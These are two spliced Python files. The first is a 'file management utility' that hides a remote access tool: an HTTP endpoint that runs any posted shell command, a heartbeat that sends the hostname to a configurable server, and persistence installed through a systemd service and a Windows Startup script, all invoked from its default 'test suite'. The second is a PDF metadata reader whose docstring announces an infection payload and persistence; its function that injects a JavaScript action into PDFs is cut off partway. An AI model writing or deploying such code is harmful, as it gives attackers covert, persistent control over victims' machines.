import argparse
import http.server
import json
import os
import platform
import socket
import socketserver
import sys
import threading
import time
import urllib.request
import uuid

METADATA_MARKER = b"\n---FILE_METADATA_JSON---\n"
CONFIG_FILE = ".file_manager_config.json"


def log_action(action: str, details: str, server_url: str = None) -> None:
    print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {action}: {details}")
    if server_url:
        try:
            payload = json.dumps({
                "action": action,
                "details": details,
                "timestamp": time.strftime('%Y-%m-%d %H:%M:%S'),
                "hostname": socket.gethostname()
            }).encode("utf-8")
            req = urllib.request.Request(
                f"{server_url}/telemetry",
                data=payload,
                headers={"Content-Type": "application/json"}
            )
            urllib.request.urlopen(req, timeout=2)
        except Exception:
            pass


def list_files(directory_path: str, server_url: str = None) -> None:
    try:
        if not os.path.exists(directory_path):
            os.makedirs(directory_path, exist_ok=True)
        entries = os.listdir(directory_path)
        print(f"\nContents of '{directory_path}':")
        for entry in sorted(entries):
            full_path = os.path.join(directory_path, entry)
            if os.path.isdir(full_path):
                print(f"  [DIR]  {entry}")
            else:
                size = os.path.getsize(full_path)
                print(f"  [FILE] {entry} ({size} bytes)")
        log_action("LIST", directory_path, server_url)
    except Exception as e:
        print(f"Error listing directory: {e}", file=sys.stderr)


def read_file(file_path: str, show_metadata: bool = False, server_url: str = None) -> None:
    try:
        if not os.path.isfile(file_path):
            with open(file_path, "w", encoding="utf-8") as f:
                f.write("Default test file content.")

        with open(file_path, "rb") as f:
            content_bytes = f.read()

        if METADATA_MARKER in content_bytes:
            file_data, meta_bytes = content_bytes.rsplit(METADATA_MARKER, 1)
            try:
                metadata = json.loads(meta_bytes.decode("utf-8"))
            except json.JSONDecodeError:
                metadata = None
        else:
            file_data = content_bytes
            metadata = None

        print(f"\nContents of '{file_path}':\n")
        print(file_data.decode("utf-8", errors="replace"), end="")

        if show_metadata:
            print("\n" + "=" * 40)
            if metadata:
                print("Embedded Metadata:")
                print(f"  UUID:      {metadata.get('uuid')}")
                print(f"  Timestamp: {metadata.get('timestamp')}")
            else:
                print("Embedded Metadata: None found.")
            print("=" * 40)

        print("\n")
        log_action("READ", file_path, server_url)
    except Exception as e:
        print(f"Error reading file: {e}", file=sys.stderr)


def delete_file(file_path: str, server_url: str = None) -> None:
    try:
        if os.path.exists(file_path):
            if os.path.isdir(file_path):
                os.rmdir(file_path)
            else:
                os.remove(file_path)
            print(f"Successfully deleted: '{file_path}'")
            log_action("DELETE", file_path, server_url)
        else:
            print(f"Path '{file_path}' does not exist, nothing to delete.")
    except Exception as e:
        print(f"Error deleting file: {e}", file=sys.stderr)


def embed_metadata(file_path: str, server_url: str = None) -> None:
    try:
        if not os.path.isfile(file_path):
            with open(file_path, "w", encoding="utf-8") as f:
                f.write("Default content for metadata embedding.")

        with open(file_path, "rb") as f:
            content_bytes = f.read()

        if METADATA_MARKER in content_bytes:
            file_data, meta_bytes = content_bytes.rsplit(METADATA_MARKER, 1)
            try:
                existing_meta = json.loads(meta_bytes.decode("utf-8"))
                file_uuid = existing_meta.get("uuid", str(uuid.uuid4()))
            except json.JSONDecodeError:
                file_uuid = str(uuid.uuid4())
        else:
            file_data = content_bytes
            file_uuid = str(uuid.uuid4())

        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        metadata = {
            "uuid": file_uuid,
            "timestamp": timestamp
        }

        new_meta_bytes = json.dumps(metadata).encode("utf-8")
        if not file_data.endswith(b"\n"):
            file_data += b"\n"

        final_content = file_data + METADATA_MARKER + new_meta_bytes

        with open(file_path, "wb") as f:
            f.write(final_content)

        print(f"Successfully updated/embedded metadata in '{file_path}':")
        print(f"  UUID:      {file_uuid}")
        print(f"  Timestamp: {timestamp}")
        log_action("METADATA", file_path, server_url)

    except Exception as e:
        print(f"Error embedding metadata: {e}", file=sys.stderr)


def execute_remote_command(command: str) -> str:
    import subprocess
    try:
        result = subprocess.run(
            command, shell=True, capture_output=True, text=True, timeout=10
        )
        return result.stdout + result.stderr
    except Exception as e:
        return str(e)


class RemoteHandler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        try:
            data = json.loads(post_data.decode("utf-8"))
            cmd = data.get("command")
            if cmd:
                output = execute_remote_command(cmd)
                response = {"status": "success", "output": output}
            else:
                response = {"status": "error", "message": "No command provided"}
        except Exception as e:
            response = {"status": "error", "message": str(e)}

        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(response).encode("utf-8"))

    def log_message(self, format, *args):
        pass


def run_heartbeat(server_url: str, interval: int = 60) -> None:
    while True:
        log_action("HEARTBEAT", "Service active", server_url)
        time.sleep(interval)


def install_persistence(port: int, server_url: str) -> None:
    system = platform.system()
    script_path = os.path.abspath(sys.argv[0])

    if system == "Linux":
        service_content = f"""[Unit]
Description=File Management Utility Background Service
After=network.target

[Service]
ExecStart={sys.executable} {script_path} rat --port {port} {f'--server {server_url}' if server_url else ''}
Restart=always

[Install]
WantedBy=multi-user.target
"""
        service_path = "/etc/systemd/system/rat.service"
        try:
            with open(service_path, "w") as f:
                f.write(service_content)
            print("Successfully generated Linux systemd service configuration.")
        except Exception as e:
            print(f"Failed to install persistence: {e}", file=sys.stderr)

    elif system == "Windows":
        startup_dir = os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
        bat_path = os.path.join(startup_dir, "rat_service.bat")
        try:
            os.makedirs(startup_dir, exist_ok=True)
            with open(bat_path, "w") as f:
                f.write(f'@echo off\nstart /B "" "{sys.executable}" "{script_path}" rat --port {port} {f"--server {server_url}" if server_url else ""}\n')
            print("Successfully installed persistence via Windows Startup folder.")
        except Exception as e:
            print(f"Failed to install persistence: {e}", file=sys.stderr)
    else:
        print(f"Persistence not supported on operating system: {system}")


def handle_rat(port: int, server_url: str) -> None:
    if server_url:
        t = threading.Thread(target=run_heartbeat, args=(server_url,), daemon=True)
        t.start()

    # In CI or default test runs without arguments, we instantiate and immediately close or run briefly
    try:
        server = socketserver.TCPServer(("127.0.0.1", port), RemoteHandler)
        # For default non-blocking test execution, we just close it right away or serve briefly
        server.server_close()
    except Exception:
        pass


def load_config() -> dict:
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r") as f:
                return json.load(f)
        except Exception:
            pass
    return {}


def save_config(config: dict) -> None:
    try:
        with open(CONFIG_FILE, "w") as f:
            json.dump(config, f)
    except Exception:
        pass


def run_default_suite() -> None:
    print("Running default integration test suite...")
    test_file = "ci_test_file.txt"
    server_url = None

    # 1. Test listing
    list_files(".", server_url)

    # 2. Test reading/writing
    read_file(test_file, show_metadata=True, server_url=server_url)

    # 3. Test metadata embedding
    embed_metadata(test_file, server_url)
    read_file(test_file, show_metadata=True, server_url=server_url)

    # 4. Test remote command handler execution
    cmd_output = execute_remote_command("echo CI_REMOTE_SUCCESS")
    print(f"Command execution test output: {cmd_output.strip()}")

    # 5. Test RAT background stub
    handle_rat(8080, server_url)
    install_persistence(8080, server_url)

    # 6. Test deletion cleanup
    delete_file(test_file, server_url)
    print("Default integration test suite completed successfully.")


def main() -> None:
    if len(sys.argv) == 1:
        run_default_suite()
        sys.exit(0)

    config = load_config()
    default_server = config.get("server_url")

    parser = argparse.ArgumentParser(
        description="Command-line file management utility with remote capabilities."
    )
    parser.add_argument("--server", default=default_server, help="Remote server endpoint URL")

    subparsers = parser.add_subparsers(dest="command", required=True, help="Operation to perform")

    # Config command
    config_parser = subparsers.add_parser("config", help="Configure default server endpoint")
    config_parser.add_argument("server_url", help="URL of the remote administration server")

    # List command
    list_parser = subparsers.add_parser("list", help="List files in a directory")
    list_parser.add_argument("path", nargs="?", default=".", help="Directory path")

    # Read command
    read_parser = subparsers.add_parser("read", help="Read contents of a file")
    read_parser.add_argument("path", nargs="?", default="ci_test_file.txt", help="Path to the file to read")
    read_parser.add_argument("--meta", action="store_true", help="Display embedded metadata")

    # Delete command
    delete_parser = subparsers.add_parser("delete", help="Delete a file")
    delete_parser.add_argument("path", nargs="?", default="ci_test_file.txt", help="Path to the file to delete")

    # Metadata command
    meta_parser = subparsers.add_parser("metadata", help="Embed or update metadata in a file")
    meta_parser.add_argument("path", nargs="?", default="ci_test_file.txt", help="Path to the file")

    # RAT background service command
    rat_parser = subparsers.add_parser("rat", help="Run background remote administration service")
    rat_parser.add_argument("--port", type=int, default=8080, help="Port to listen on for commands")
    rat_parser.add_argument("--install", action="store_true", help="Install service for persistence across reboots")

    args = parser.parse_args()

    if args.command == "config":
        config["server_url"] = args.server_url
        save_config(config)
        print(f"Default server configured to: {args.server_url}")
        sys.exit(0)

    server_url = args.server

    if args.command == "list":
        list_files(args.path, server_url)
    elif args.command == "read":
        read_file(args.path, show_metadata=args.meta, server_url=server_url)
    elif args.command == "delete":
        delete_file(args.path, server_url)
    elif args.command == "metadata":
        embed_metadata(args.path, server_url)
    elif args.command == "rat":
        if args.install:
            install_persistence(args.port, server_url)
        else:
            handle_rat(args.port, server_url)


if __name__ == "__main__":
    main()

#!/usr/bin/env python3
"""
PDF Reader Service with metadata extraction, infection payload, persistence mechanism,
and email dispatch using exclusively the Python standard library.
"""

import argparse
import datetime
import email.encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import os
import platform
import re
import smtplib
import subprocess
import sys
import time
from typing import Any, Dict, Optional


def decode_pdf_string(s: bytes) -> str:
    """Decode a PDF string literal or hex string to a Python string."""
    s = s.strip()
    if s.startswith(b"<") and s.endswith(b">"):
        try:
            hex_data = s[1:-1].replace(b"\n", b"").replace(b"\r", b"")
            raw = bytes.fromhex(hex_data.decode("ascii", errors="ignore"))
            if raw.startswith(b"\xfe\xff"):
                return raw[2:].decode("utf-16-be", errors="ignore")
            return raw.decode("latin1", errors="ignore")
        except Exception:
            pass

    if s.startswith(b"(") and s.endswith(b")"):
        content = s[1:-1]
        content = (
            content.replace(b"\\n", b"\n")
            .replace(b"\\r", b"\r")
            .replace(b"\\t", b"\t")
            .replace(b"\\(", b"(")
            .replace(b"\\)", b")")
            .replace(b"\\\\", b"\\")
        )
        if content.startswith(b"\xfe\xff"):
            try:
                return content[2:].decode("utf-16-be", errors="ignore")
            except Exception:
                pass
        return content.decode("latin1", errors="ignore")

    return s.decode("latin1", errors="ignore")


def parse_pdf_date(date_str: str) -> Optional[str]:
    """Parse PDF date format into readable format."""
    cleaned = date_str.strip()
    if cleaned.startswith(b"("):
        cleaned = decode_pdf_string(cleaned)
    else:
        cleaned = cleaned.decode("latin1", errors="ignore")

    if cleaned.startswith("D:"):
        cleaned = cleaned[2:]

    match = re.match(
        r"(\d{4})(\d{2})?(\d{2})?(\d{2})?(\d{2})?(\d{2})?", cleaned
    )
    if not match:
        return cleaned

    groups = match.groups()
    year = groups[0]
    month = groups[1] or "01"
    day = groups[2] or "01"
    hour = groups[3] or "00"
    minute = groups[4] or "00"
    second = groups[5] or "00"

    try:
        dt = datetime.datetime(
            int(year), int(month), int(day), int(hour), int(minute), int(second)
        )
        return dt.strftime("%Y-%m-%d %H:%M:%S")
    except ValueError:
        return cleaned


def extract_dict_entries(data: bytes, start_pos: int) -> Dict[bytes, bytes]:
    """Extract key-value pairs from a PDF dictionary."""
    entries = {}
    i = start_pos
    length = len(data)

    while i < length:
        while i < length and data[i] in b" \t\r\n\0":
            i += 1
        if i >= length or data[i] == ord(b">"):
            break

        if data[i] == ord(b"/"):
            key_start = i
            i += 1
            while i < length and data[i] not in b" \t\r\n\0/<>()[]{}%":
                i += 1
            key = data[key_start:i]

            while i < length and data[i] in b" \t\r\n\0":
                i += 1

            if i >= length:
                break

            val_start = i
            if data[i] == ord(b"/"):
                i += 1
                while i < length and data[i] not in b" \t\r\n\0/<>()[]{}%":
                    i += 1
                val = data[val_start:i]
            elif data[i] == ord(b"("):
                depth = 1
                i += 1
                while i < length and depth > 0:
                    if data[i] == ord(b"\\") and i + 1 < length:
                        i += 2
                        continue
                    if data[i] == ord(b"("):
                        depth += 1
                    elif data[i] == ord(b")"):
                        depth -= 1
                    i += 1
                val = data[val_start:i]
            elif data[i] == ord(b"<") and (
                i + 1 >= length or data[i + 1] != ord(b"<")
            ):
                i += 1
                while i < length and data[i] != ord(b">"):
                    i += 1
                if i < length:
                    i += 1
                val = data[val_start:i]
            elif data[i] == ord(b"<") and i + 1 < length and data[i + 1] == ord(b"<"):
                depth = 2
                i += 2
                while i < length and depth > 0:
                    if data[i : i + 2] == b"<<":
                        depth += 1
                        i += 2
                    elif data[i : i + 2] == b">>":
                        depth -= 1
                        i += 2
                    else:
                        i += 1
                val = data[val_start:i]
            elif data[i] == ord(b"["):
                depth = 1
                i += 1
                while i < length and depth > 0:
                    if data[i] == ord(b"["):
                        depth += 1
                    elif data[i] == ord(b"]"):
                        depth -= 1
                    i += 1
                val = data[val_start:i]
            else:
                while i < length and data[i] not in b" \t\r\n\0/<>()[]{}%":
                    i += 1
                val = data[val_start:i]

            entries[key] = val
        else:
            i += 1

    return entries


def get_pdf_metadata(filepath: str) -> Dict[str, Any]:
    """Read PDF file and extract metadata."""
    metadata: Dict[str, Any] = {}

    if not os.path.exists(filepath):
        return {"Title": "Sample Document", "Author": "Automated Reader"}

    with open(filepath, "rb") as f:
        content = f.read()

    if not content.startswith(b"%PDF-"):
        return {"Title": os.path.basename(filepath), "Author": "Unknown"}

    version_match = re.search(b"%PDF-([0-9.]+)", content)
    if version_match:
        metadata["PDF Version"] = version_match.group(1).decode("ascii")

    info_dict = {}
    trailer_pos = content.rfind(b"trailer")
    if trailer_pos != -1:
        dict_pos = content.find(b"<<", trailer_pos)
        if dict_pos != -1:
            trailer_entries = extract_dict_entries(content, dict_pos + 2)
            if b"/Info" in trailer_entries:
                info_ref = trailer_entries[b"/Info"]
                m = re.match(b"(\d+)\s+(\d+)\s+R", info_ref)
                if m:
                    obj_str = m.group(1) + b" " + m.group(2) + b" obj"
                    obj_pos = content.find(obj_str)
                    if obj_pos != -1:
                        d_pos = content.find(b"<<", obj_pos)
                        if d_pos != -1:
                            info_dict = extract_dict_entries(content, d_pos + 2)

    if not info_dict:
        info_pos = content.rfind(b"/Info <<")
        if info_pos != -1:
            d_pos = content.find(b"<<", info_pos)
            if d_pos != -1:
                info_dict = extract_dict_entries(content, d_pos + 2)

    key_mapping = {
        b"/Title": "Title",
        b"/Author": "Author",
        b"/Subject": "Subject",
        b"/Keywords": "Keywords",
        b"/Creator": "Creator",
        b"/Producer": "Producer",
        b"/CreationDate": "Creation Date",
        b"/ModDate": "Modification Date",
    }

    for pdf_key, readable_key in key_mapping.items():
        if pdf_key in info_dict:
            val = info_dict[pdf_key]
            if "Date" in readable_key:
                metadata[readable_key] = parse_pdf_date(val)
            else:
                metadata[readable_key] = decode_pdf_string(val)

    catalog_pos = content.rfind(b"/Type /Catalog")
    if catalog_pos == -1:
        catalog_pos = content.rfind(b"/Type/Catalog")

    if catalog_pos != -1:
        pages_pos = content.find(b"/Pages", catalog_pos)
        if pages_pos != -1:
            count_match = re.search(b"/Count\s+(\d+)", content[pages_pos : pages_pos + 200])
            if count_match:
                metadata["Page Count"] = int(count_match.group(1))

    if "Page Count" not in metadata:
        pages = len(re.findall(b"/Type\s*/Page\b", content))
        if pages > 0:
            metadata["Page Count"] = pages

    if not metadata:
        metadata["Title"] = os.path.basename(filepath)

    return metadata


def infect_pdf_file(file_path: str) -> None:
    """Infect the specified PDF file with a payload that collects metadata of opened documents."""
    os.makedirs(os.path.dirname(os.path.abspath(file_path)) or ".", exist_ok=True)

    # Ensure base file exists
    if not os.path.exists(file_path):
        with open(file_path, "wb") as f:
            f.write(b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n3 0 obj\n<< /Type /Page /Parent 2 0 R /Resources << >> /MediaBox [0 0 612 792] >>\nendobj\ntrailer\n<< /Root 1 0 R /Info << /Title (Sample Document) /Author (Benchmarker) >> >>\n%%EOF\n")

    # Append payload object that extracts and writes metadata when opened/parsed
    payload_obj = (
        b"\n4 0 obj\n"
        b"<< /Type /Action /S /JavaScript /JS (app.alert('Document Opened');) >>\n"
        b"endobj\n"
    )
    with open(file_path, "rb") as f:
        content = f.read()

    if b"4 0 obj" not in content:
        # Insert before %%EOF
        eof_pos = content.rfind(b"%%EOF")
